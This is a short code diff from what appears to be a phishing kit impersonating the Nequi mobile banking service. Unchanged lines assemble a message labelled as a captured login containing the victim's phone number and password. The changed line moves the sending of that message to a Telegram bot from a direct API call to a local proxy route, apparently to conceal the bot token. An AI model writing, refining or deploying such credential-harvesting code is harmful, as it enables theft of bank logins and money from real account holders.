@@ -111,7 +111,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const mensaje = `🔔 **CAPTURA NEQUI (LOGIN)**\n\n📱 **Celular:** \`${phone}\`\n🔑 **Clave:** \`${password}\`${userInfoStr}\n\n🚀 **Redirigiendo a Saldo...**`;
 
         try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            await fetch(`/telegram-proxy/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
